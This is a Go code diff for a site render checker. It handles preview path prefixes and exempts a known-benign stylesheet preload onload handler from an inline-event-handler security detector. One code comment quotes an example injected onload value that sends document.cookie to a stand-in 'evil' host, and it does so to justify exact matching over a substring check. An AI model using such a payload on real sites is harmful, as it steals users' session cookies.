@@ -304,6 +304,7 @@ func brokenInternalLinksFromDoc(idx *site.Index, page site.Page, doc *html.Node)
 	if err != nil {
 		return nil, err
 	}
+	previewPrefix := previewPrefixFromPath(base.Path)
 	classifier := site.NewClassifier(idx)
 	var broken []string
 	for _, href := range extractLinksFromDoc(doc) {
@@ -311,6 +312,7 @@ func brokenInternalLinksFromDoc(idx *site.Index, page site.Page, doc *html.Node)
 		if !ok {
 			continue
 		}
+		target.Path = stripPreviewPrefix(target.Path, previewPrefix)
 		if shouldIgnoreBrokenLinkTarget(classifier, target.Path) {
 			continue
 		}
@@ -342,6 +344,7 @@ func checkMissingImages(cfg config.Config, page site.Page, doc *html.Node) rende
 	if err != nil {
 		return renderCheckResult{Check: "missing_images", Status: "warn", Detail: "page URL could not be parsed, skipped image check"}
 	}
+	previewPrefix := previewPrefixFromPath(base.Path)
 	var missing []string
 	walkNodes(doc, func(n *html.Node) bool {
 		if n.Type == html.ElementNode && n.Data == "img" {
@@ -353,6 +356,7 @@ func checkMissingImages(cfg config.Config, page site.Page, doc *html.Node) rende
 			if !ok {
 				return true
 			}
+			target.Path = stripPreviewPrefix(target.Path, previewPrefix)
 			localPath := filepath.Join(cfg.SiteRoot, filepath.FromSlash(strings.TrimPrefix(target.Path, "/")))
 			if _, statErr := os.Stat(localPath); statErr != nil {
 				missing = append(missing, src)
@@ -492,6 +496,9 @@ func checkRenderedInlineEventHandlers(doc *html.Node) renderCheckResult {
 		for _, attr := range n.Attr {
 			key := strings.ToLower(strings.TrimSpace(attr.Key))
 			if strings.HasPrefix(key, "on") && strings.TrimSpace(attr.Val) != "" {
+				if isBenignStylesheetPreloadOnload(n, key, attr.Val) {
+					continue
+				}
 				findings = append(findings, fmt.Sprintf("<%s> has inline handler %s", n.Data, key))
 				if len(findings) >= 5 {
 					return false
@@ -504,6 +511,65 @@ func checkRenderedInlineEventHandlers(doc *html.Node) renderCheckResult {
 		return renderCheckResult{Check: "security_inline_event_handlers", Status: "fail", Detail: strings.Join(findings, "; ")}
 	}
 	return renderCheckResult{Check: "security_inline_event_handlers", Status: "pass"}
+}
+
+// benignStylesheetPreloadOnloadValues is the exact, known-safe loadCSS
+// polyfill idiom for lazy-loading a stylesheet via <link rel=preload
+// as=style onload=...>. isBenignStylesheetPreloadOnload requires an exact
+// match (after trimming/case-folding) against one of these — not a substring
+// containment check — because this function's only job is to exempt a
+// specific known-benign static theme pattern from
+// checkRenderedInlineEventHandlers, the detector that exists to catch
+// injected inline event handlers. A Contains-based check would let an
+// attacker-controlled onload value that merely embeds this substring (e.g.
+// `onload="this.rel='stylesheet';fetch('https://evil/x?c='+document.cookie)"`)
+// slip past the detector unflagged, defeating its purpose for the one
+// pattern most likely to actually be exploited.
+//
+// Only the this.onload=null;this.rel=... form is listed: it's the one
+// pattern LoveIt's own layouts/_partials/plugin/style.html actually emits
+// (single-quoted). A bare this.rel=... with no this.onload=null prefix
+// leaves the handler attached after firing once — that's not what the
+// theme does, and it would be a weaker, more injection-shaped signal to
+// wave through, so it's deliberately not included without a confirmed
+// emitter for it.
+var benignStylesheetPreloadOnloadValues = map[string]struct{}{
+	`this.onload=null;this.rel='stylesheet'`: {},
+	`this.onload=null;this.rel="stylesheet"`: {},
+}
+
+func isBenignStylesheetPreloadOnload(n *html.Node, key, val string) bool {
+	if n == nil || n.Type != html.ElementNode || n.Data != "link" || key != "onload" {
+		return false
+	}
+	rel := strings.ToLower(strings.TrimSpace(htmlAttr(n, "rel")))
+	as := strings.ToLower(strings.TrimSpace(htmlAttr(n, "as")))
+	val = strings.ToLower(strings.TrimSpace(val))
+	val = strings.TrimSuffix(val, ";")
+	if rel != "preload" || as != "style" {
+		return false
+	}
+	_, ok := benignStylesheetPreloadOnloadValues[val]
+	return ok
+}
+
+func previewPrefixFromPath(path string) string {
+	parts := strings.Split(strings.Trim(path, "/"), "/")
+	if len(parts) < 2 || parts[0] != "preview" {
+		return ""
+	}
+	return "/preview/" + parts[1]
+}
+
+func stripPreviewPrefix(path, prefix string) string {
+	if prefix == "" || !strings.HasPrefix(path, prefix+"/") {
+		return path
+	}
+	stripped := strings.TrimPrefix(path, prefix)
+	if stripped == "" {
+		return "/"
+	}
+	return stripped
 }
 
 func checkRenderedUnsafeURLs(doc *html.Node) renderCheckResult {
